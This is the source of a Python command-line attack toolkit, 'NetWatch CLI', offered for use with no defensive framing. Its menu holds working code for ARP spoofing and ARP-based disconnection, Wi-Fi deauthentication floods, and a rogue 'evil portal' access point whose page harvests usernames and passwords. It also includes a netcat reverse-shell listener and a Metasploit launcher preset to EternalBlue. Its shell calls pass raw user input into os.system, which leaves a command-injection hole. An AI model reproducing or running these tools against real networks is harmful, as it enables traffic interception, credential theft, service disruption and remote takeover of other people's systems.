#!/usr/bin/env python3
"""
NetWatch CLI v1.0
Author: Niko DeRuise

A command-line version of NetWatch Toolkit for use in terminal-based environments.
"""

import os
import subprocess
import time
from scapy.all import ARP, Ether, srp, send
import socket

# === Helpers ===
def clear():
    os.system("clear" if os.name == "posix" else "cls")

def pause():
    input("\n[↩] Press Enter to return to menu...")

def run_cmd(cmd):
    try:
        result = subprocess.getoutput(cmd)
        print(result)
    except Exception as e:
        print(f"[!] Error: {e}")

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

# === Functions ===

def nmap_scan():
    target = input("[?] Target IP/Range: ")
    run_cmd(f"nmap -sS -Pn {target}")
    pause()

def recon_tools():
    target = input("[?] IP or Domain: ")
    print("\n[+] WHOIS:")
    run_cmd(f"whois {target}")
    print("\n[+] GeoIP:")
    run_cmd(f"geoiplookup {target}")
    print("\n[+] ASN Lookup:")
    run_cmd(f"whois -h whois.cymru.com \" -v {target}\"")
    pause()

def arp_scan():
    net = input("[?] Network CIDR (e.g. 192.168.1.0/24): ")
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net)
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for _, r in ans:
        print(f"{r.psrc} - {r.hwsrc}")
    pause()

def arp_spoof():
    target_ip = input("[?] Target IP: ")
    gateway_ip = input("[?] Gateway IP: ")
    try:
        tgt_mac = get_mac(target_ip)
        gw_mac = get_mac(gateway_ip)
        print("[*] Spoofing in loop... Press Ctrl+C to stop.")
        while True:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=tgt_mac), verbose=0)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gw_mac), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[x] Spoofing stopped.")
    pause()

def arp_kick():
    target_ip = input("[?] Target IP: ")
    gateway_ip = input("[?] Gateway IP: ")
    count = int(input("[?] Packets to send (default 150): ") or "150")
    for i in range(count):
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="00:00:00:00:00:00"), verbose=0)
        print(f"[{i+1}/{count}] Sent ARP Kick")
        time.sleep(0.05)
    print("✓ Kick Complete")
    pause()

def deauth_attack():
    iface = input("[?] Monitor Interface: ")
    target = input("[?] Target MAC: ")
    ap = input("[?] AP MAC: ")
    print("[*] Sending 100 deauth packets...")
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth()
    sendp(pkt, iface=iface, count=100, inter=0.1, verbose=0)
    print("[✓] Deauth packets sent.")
    pause()

def evil_portal():
    ssid = input("[?] SSID: ")
    iface = input("[?] Wireless Interface: ")
    os.makedirs("netwatch_portal", exist_ok=True)
    os.chdir("netwatch_portal")
    with open("index.html", "w") as f:
        f.write("<form method='POST' action='/creds'><input name='user'><input name='pass'><input type='submit'></form>")
    with open("hostapd.conf", "w") as f:
        f.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0")
    with open("dnsmasq.conf", "w") as f:
        f.write(f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.100,12h\naddress=/#/10.0.0.1")
    os.system(f"ip link set {iface} down")
    os.system(f"ip addr flush dev {iface}")
    os.system(f"ip addr add 10.0.0.1/24 dev {iface}")
    os.system(f"ip link set {iface} up")
    os.system("iptables -t nat -F && iptables -F")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80 -j REDIRECT --to-port 8080")
    os.system("x-terminal-emulator -e 'hostapd hostapd.conf' &")
    os.system("x-terminal-emulator -e 'dnsmasq -C dnsmasq.conf' &")
    os.system("python3 -m http.server 8080")
    pause()

def reverse_shell():
    port = input("[?] Listening Port (e.g. 4444): ")
    os.system(f"x-terminal-emulator -e 'nc -lvnp {port}'")
    pause()

def cve_scanner():
    target = input("[?] Target for Nmap Vuln Scan: ")
    result = subprocess.getoutput(f"nmap --script vuln {target}")
    print(result)
    import re
    cves = list(set(re.findall(r'CVE-\d{4}-\d{4,7}', result)))
    print("\n[+] Detected CVEs:")
    for cve in cves:
        print(f"- {cve}")
    if cves:
        print("\n[+] SearchSploit References:")
        for cve in cves:
            print(f"\n{cve}:\n{os.popen(f'searchsploit {cve}').read()}")
    pause()

def packet_capture():
    iface = input("[?] Interface: ")
    outfile = input("[?] Output File: ")
    os.system(f"x-terminal-emulator -e 'tcpdump -i {iface} -w {outfile}'")
    pause()

def mac_changer():
    iface = input("[?] Interface: ")
    mac = input("[?] New MAC (blank for random): ")
    os.system(f"ifconfig {iface} down")
    if mac:
        os.system(f"macchanger -m {mac} {iface}")
    else:
        os.system(f"macchanger -r {iface}")
    os.system(f"ifconfig {iface} up")
    print(f"[✓] MAC changed on {iface}")
    pause()

def metasploit_launcher():
    exp = input("[?] Exploit Path (e.g. exploit/windows/smb/ms17_010_eternalblue): ")
    rhost = input("[?] RHOST: ")
    lhost = input("[?] LHOST: ")
    lport = input("[?] LPORT (default 4444): ") or "4444"
    with open("msf.rc", "w") as f:
        f.write(f"use {exp}\nset RHOST {rhost}\nset LHOST {lhost}\nset LPORT {lport}\nexploit\n")
    os.system("x-terminal-emulator -e 'msfconsole -r msf.rc'")
    pause()

# === Menu ===
def menu():
    while True:
        clear()
        print("""\033[96m
 ███╗   ██╗███████╗████████╗██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
 ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║ ██╔╝
 ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║███████║   ██║   ██║     █████╔╝ 
 ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██╔══██║   ██║   ██║     ██╔═██╗ 
 ██║ ╚████║███████╗   ██║   ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██╗
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
                \033[0mCreated by Niko DeRuise | NetWatch CLI v1.0

 1. Nmap Scan                2. Recon Tools (WHOIS, GeoIP, ASN)
 3. ARP Scan                 4. ARP Spoof                    5. ARP Kick
 6. Deauth Attack            7. Evil Portal (Captive AP)     8. Reverse Shell
 9. CVE Scanner              10. Packet Capture              11. MAC Changer
12. Metasploit Launcher      0. Exit
""")
        choice = input("Select option: ")
        if choice == "1": nmap_scan()
        elif choice == "2": recon_tools()
        elif choice == "3": arp_scan()
        elif choice == "4": arp_spoof()
        elif choice == "5": arp_kick()
        elif choice == "6": deauth_attack()
        elif choice == "7": evil_portal()
        elif choice == "8": reverse_shell()
        elif choice == "9": cve_scanner()
        elif choice == "10": packet_capture()
        elif choice == "11": mac_changer()
        elif choice == "12": metasploit_launcher()
        elif choice == "0": exit()
        else: input("[!] Invalid option. Press Enter.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root.")
        exit()
    menu()